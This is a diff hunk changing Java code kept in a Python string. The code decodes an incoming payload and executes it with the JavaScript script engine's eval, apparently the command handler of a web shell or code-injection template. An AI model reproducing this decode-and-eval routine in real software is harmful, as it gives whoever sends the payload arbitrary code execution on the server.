@@ -4,7 +4,7 @@ code = """
         if (payload == null) {
             return null;
         }
-        payload = decoder(payload);
+        payload = new String(decoder(payload));
         String result = (new javax.script.ScriptEngineManager()
                 .getEngineByName("js").eval(payload)).toString();
         return result;
